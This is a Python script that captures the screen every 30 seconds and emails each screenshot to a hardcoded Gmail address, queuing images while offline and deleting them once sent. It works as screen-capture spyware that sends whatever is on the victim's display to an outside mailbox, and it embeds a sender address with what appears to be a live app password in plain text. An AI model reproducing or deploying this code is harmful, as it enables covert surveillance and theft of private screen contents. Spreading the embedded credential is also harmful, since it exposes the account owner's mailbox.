import smtplib
import os
import time
import socket  # Added missing import
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from datetime import datetime
import threading
import logging
from PIL import ImageGrab

# Configure logging
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration
CONFIG = {
    "email": {
        "sender": "edearn70@gmail.com",
        "recipient": "wasiemmanuela183@gmail.com",
        "password": "bjrj xhyx ockp rtvz",
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587
    },
    "screenshot": {
        "capture_interval": 30,    # seconds
        "max_offline_storage": 50   # max files to store when offline
    },
    "paths": {
        "screenshots": "screenshots"
    }
}

# Create directories if they don't exist
try:
    os.makedirs(CONFIG["paths"]["screenshots"], exist_ok=True)
except Exception as e:
    logging.error(f"Failed to create screenshot directory: {e}")
    exit(1)

# Global flags
is_online = False
stop_flag = False

def check_internet():
    """Check internet connectivity with timeout"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        return False

def send_email(subject, body, attachments=None):
    """Send email with attachments"""
    if attachments is None:
        attachments = []
    
    try:
        message = MIMEMultipart()
        message['Subject'] = subject
        message['From'] = CONFIG["email"]["sender"]
        message['To'] = CONFIG["email"]["recipient"]
        message.attach(MIMEText(body))

        for file_path in attachments:
            if not os.path.exists(file_path):
                continue
                
            with open(file_path, "rb") as f:
                part = MIMEApplication(f.read(), Name=os.path.basename(file_path))
                part['Content-Disposition'] = f'attachment; filename="{os.path.basename(file_path)}"'
                message.attach(part)

        with smtplib.SMTP(CONFIG["email"]["smtp_server"], CONFIG["email"]["smtp_port"]) as smtp:
            smtp.starttls()
            smtp.login(CONFIG["email"]["sender"], CONFIG["email"]["password"])
            smtp.sendmail(CONFIG["email"]["sender"], CONFIG["email"]["recipient"], message.as_string())
        logging.info(f"Email sent with {len(attachments)} attachment(s).")
        return True
    except Exception as e:
        logging.error(f"Email error: {e}")
        return False

def send_pending_files():
    """Send all pending screenshots"""
    global is_online
    
    if not is_online:
        return
        
    pending_files = []
    try:
        for file in os.listdir(CONFIG["paths"]["screenshots"]):
            file_path = os.path.join(CONFIG["paths"]["screenshots"], file)
            if os.path.isfile(file_path) and file.lower().endswith('.png'):
                pending_files.append(file_path)
        
        if pending_files:
            # Sort files by creation time to send oldest first
            pending_files.sort(key=os.path.getmtime)
            
            # Send in batches of 3 to avoid email size limits
            batch_size = 3
            for i in range(0, len(pending_files), batch_size):
                batch = pending_files[i:i + batch_size]
                if send_email("Pending Screenshots", "Attached are the screenshots from offline period.", batch):
                    for file_path in batch:
                        try:
                            os.remove(file_path)
                            logging.info(f"Deleted sent file: {file_path}")
                        except Exception as e:
                            logging.error(f"Error deleting file {file_path}: {e}")
    except Exception as e:
        logging.error(f"Error in send_pending_files: {e}")

def capture_screenshot():
    """Capture screenshot and save to file"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(CONFIG["paths"]["screenshots"], f"screenshot_{timestamp}.png")
        img = ImageGrab.grab()
        img.save(filename, quality=70)  # Reduce quality to save space
        logging.info(f"Screenshot saved: {filename}")
        return filename
    except Exception as e:
        logging.error(f"Screenshot capture error: {e}")
        return None

def cleanup_old_files():
    """Clean up old screenshots if storage limit reached"""
    try:
        files = [os.path.join(CONFIG["paths"]["screenshots"], f) 
                for f in os.listdir(CONFIG["paths"]["screenshots"]) 
                if f.lower().endswith('.png')]
        
        if len(files) > CONFIG["screenshot"]["max_offline_storage"]:
            # Sort by modification time (oldest first)
            files.sort(key=os.path.getmtime)
            
            # Delete oldest files until we're under the limit
            while len(files) > CONFIG["screenshot"]["max_offline_storage"]:
                try:
                    os.remove(files[0])
                    logging.info(f"Deleted old screenshot: {files[0]}")
                    files.pop(0)
                except Exception as e:
                    logging.error(f"Error deleting old screenshot: {e}")
                    break
    except Exception as e:
        logging.error(f"Error in cleanup_old_files: {e}")

def screenshot_monitoring_loop():
    """Screenshot capture and sending loop"""
    global is_online, stop_flag
    
    while not stop_flag:
        try:
            # Check internet status
            current_status = check_internet()
            if current_status != is_online:
                is_online = current_status
                logging.info(f"Internet status changed: {'Online' if is_online else 'Offline'}")
                
                # If just came online, send any pending screenshots
                if is_online:
                    send_pending_files()
            
            # Capture screenshot
            screenshot_file = capture_screenshot()
            
            if screenshot_file:
                # If online, try to send immediately
                if is_online:
                    if send_email("New Screenshot", "Attached is the latest screenshot.", [screenshot_file]):
                        try:
                            os.remove(screenshot_file)
                            logging.info(f"Deleted sent screenshot: {screenshot_file}")
                        except Exception as e:
                            logging.error(f"Error removing sent screenshot: {e}")
                else:
                    # If offline, check if we need to clean up old files
                    cleanup_old_files()
            
            # Wait for the next capture interval
            time.sleep(CONFIG["screenshot"]["capture_interval"])
                
        except Exception as e:
            logging.error(f"Error in screenshot monitoring loop: {e}")
            time.sleep(5)  # Wait before retrying

def main():
    global stop_flag
    
    try:
        # Start screenshot monitoring thread
        screenshot_thread = threading.Thread(target=screenshot_monitoring_loop)
        screenshot_thread.daemon = False
        
        logging.info("Screenshot monitoring starting...")
        screenshot_thread.start()
        
        logging.info("Monitoring started. Press Ctrl+C to stop...")
        
        # Keep main thread alive
        while screenshot_thread.is_alive():
            time.sleep(1)
            
    except KeyboardInterrupt:
        logging.info("\nStopping monitoring...")
        stop_flag = True
        screenshot_thread.join(timeout=5)
        logging.info("Monitoring stopped.")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        stop_flag = True

if __name__ == "__main__":
    main()